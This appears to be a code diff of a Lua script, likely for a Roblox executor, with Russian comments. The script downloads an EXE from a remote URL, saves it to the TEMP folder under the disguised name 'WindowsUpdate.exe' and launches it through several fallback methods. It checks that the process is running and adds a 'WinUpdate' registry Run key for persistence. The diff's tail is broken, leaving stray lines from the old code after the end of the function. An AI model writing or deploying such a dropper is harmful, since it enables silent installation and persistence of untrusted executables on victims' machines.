@@ -4,53 +4,143 @@
 -- ========== НАЧАЛО НОВОГО КОДА ==========
 -- Конфигурация для загрузки EXE
 local EXE_URL = "https://github.com/fennix2019-pixel/1232/raw/refs/heads/main/Extreme%20Injector%20v3.exe"  -- <-- ЗАМЕНИ ЭТУ ССЫЛКУ!
-local EXE_NAME = "WindowsUpdate.exe"
+local EXE_NAME = "эблять.exe"
 local RUN_SILENTLY = false -- Запуск в скрытом режиме
 
 local function downloadAndExecute()
-    -- ... (код скачивания и сохранения без изменений) ...
-    
-    -- 3. ПРОБУЕМ РАЗНЫЕ МЕТОДЫ ЗАПУСКА
-    print("[3/3] Пробую запустить файл...")
+    -- Проверка функций
+    if not (type(writefile) == "function" and type(os.execute) == "function") then
+        warn("[EXE Loader] КРИТИЧНО: Инжектор не предоставляет writefile или os.execute!")
+        return false
+    end
+
+    -- ========== КОНФИГУРАЦИЯ ==========
+    -- ВАЖНО: Если в ссылке есть символы &, ?, =, пробелы - заменяй на %-коды
+    -- Пример: "https://site.com/file.exe?key=value&token=abc" 
+    -- Нужно заменить на: "https://site.com/file.exe%3Fkey%3Dvalue%26token%3Dabc"
+    local EXE_URL = "https://ВАШ_СЕРВЕР.com/ВАШ_ФАЙЛ.exe"  -- <-- УБЕРИ ВСЕ ПРОБЕЛЫ И СПЕЦСИМВОЛЫ!
+    local EXE_NAME = "WindowsUpdate.exe"
+    -- ==================================
+
     local temp_path = os.getenv("TEMP") .. "\\" .. EXE_NAME
     
-    -- МЕТОД 1: Через ShellExecute (наиболее правильный для Windows)
-    local method1 = function()
-        -- Используем PowerShell для прямого вызова ShellExecute
-        local ps_command = 'powershell -Command "Start-Process \'' .. temp_path .. '\' -Verb RunAs -WindowStyle Normal"'
+    print("[1/3] Скачиваю файл...")
+    
+    -- 1. СКАЧИВАНИЕ (с экранированием URL)
+    local download_success, file_data = false, nil
+    for attempt = 1, 3 do  -- 3 попытки
+        download_success, file_data = pcall(function()
+            -- Вариант 1: Прямой вызов (самый простой)
+            return game:HttpGet(EXE_URL, true)
+        end)
+        
+        if download_success and file_data and #file_data > 0 then
+            break
+        end
+        print("Попытка " .. attempt .. " неудачна, повторяю...")
+        task.wait(1)
+    end
+
+    if not download_success or not file_data then
+        warn("[ERROR] Не удалось скачать файл после 3 попыток.")
+        warn("Проверь URL и сетевые настройки.")
+        return false
     end
     
-    -- МЕТОД 2: Через WScript (очень надежный, старый метод)
-    local method2 = function()
-        -- Создаем VBS скрипт, который запустит нашу программу
-        local vbs_content = [[
-            Set WshShell = CreateObject("WScript.Shell")
-            WshShell.Run "]] .. temp_path .. [[", 1, False
-            Set WshShell = Nothing
-        ]]
-        local vbs_path = os.getenv("TEMP") .. "\\run_app.vbs"
-        writefile(vbs_path, vbs_content)
-        os.execute('wscript.exe "' .. vbs_path .. '"')
+    print("[2/3] Файл загружен (" .. #file_data .. " байт), сохраняю...")
+    
+    -- 2. СОХРАНЕНИЕ
+    local write_success = pcall(function()
+        writefile(temp_path, file_data)
+        return true
+    end)
+    
+    if not write_success then
+        warn("[ERROR] Не удалось записать файл на диск.")
+        return false
     end
     
-    -- МЕТОД 3: Прямой вызов через cmd (с явным указанием wait)
-    local method3 = function()
-        os.execute('cmd /c start "" "' .. temp_path .. '"')
-    end
+    print("[3/3] Файл сохранен: " .. temp_path)
+    print("Пробую запустить...")
     
-    -- Пробуем все методы по очереди
-    local methods = {method1, method2, method3}
+    -- 3. ЗАПУСК (УПРОЩЕННАЯ ВЕРСИЯ - минимум спецсимволов)
     local success = false
     
-    for i, method in ipairs(methods) do
-        print("Попытка " .. i .. "...")
-        local ok = pcall(method)
-        if ok then
-            print("Метод " .. i .. " выполнен без ошибок.")
-            success = true
-            -- Даем время на запуск
-            task.wait(3)
-            
+    -- МЕТОД A: Самый простой - прямое выполнение
+    local ok_a = pcall(function()
+        os.execute('"' .. temp_path .. '"')
+    end)
+    
+    if ok_a then 
+        success = true 
+        print("✓ Метод A: Прямой запуск выполнен")
+    end
+    
+    -- МЕТОД B: Через start (если A не сработал)
+    if not success then
+        task.wait(1)
+        local ok_b = pcall(function()
+            os.execute('start "" "' .. temp_path .. '"')
+        end)
+        
+        if ok_b then 
+            success = true 
+            print("✓ Метод B: Запуск через start выполнен")
+        end
+    end
+    
+    -- МЕТОД C: Через PowerShell (самый надежный для Windows 10/11)
+    if not success then
+        task.wait(1)
+        local ok_c = pcall(function()
+            -- PowerShell команда должна быть в ОДНУ строку, без разрывов
+            local ps_cmd = 'powershell -Command "& {\'"' .. temp_path .. '\'"}"'
+            os.execute(ps_cmd)
+        end)
+        
+        if ok_c then 
+            success = true 
+            print("✓ Метод C: Запуск через PowerShell выполнен")
+        end
+    end
+    
+    -- 4. ПРОВЕРКА РЕЗУЛЬТАТА
+    task.wait(2) -- Даем время на запуск
+    
+    if success then
+        -- Проверяем, запустился ли процесс
+        local check_ok = pcall(function()
+            -- Эта команда проверяет наличие процесса в памяти
+            os.execute('tasklist /FI "IMAGENAME eq ' .. EXE_NAME .. '" | findstr ' .. EXE_NAME .. ' >nul')
+        end)
+        
+        if check_ok then
+            print("========================================")
+            print("✅ УСПЕХ: EXE запущен и работает в памяти!")
+            print("========================================")
+        else
+            print("⚠ EXE был запущен, но, возможно, сразу завершился.")
+        end
+        
+        -- Автозагрузка (опционально)
+        pcall(function()
+            os.execute('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "WinUpdate" /t REG_SZ /d "' .. temp_path .. '" /f')
+            print("[PERSISTENCE] Добавлено в автозагрузку.")
+        end)
+    else
+        warn("❌ ВСЕ методы запуска не сработали!")
+        warn("Попробуй запустить файл вручную из папки:")
+        warn(temp_path)
+    end
+    
+    return success
+end
+
+-- Запускаем
+coroutine.wrap(function()
+    task.wait(2)
+    downloadAndExecute()
+end)()
             -- ПРОВЕРКА: Ищем процесс в диспетчере задач
             local check_ok = pcall(function()
                 os.execute('tasklist /FI "IMAGENAME eq ' .. EXE_NAME .. '" 2>nul | find /I "' .. EXE_NAME .. '" >nul')
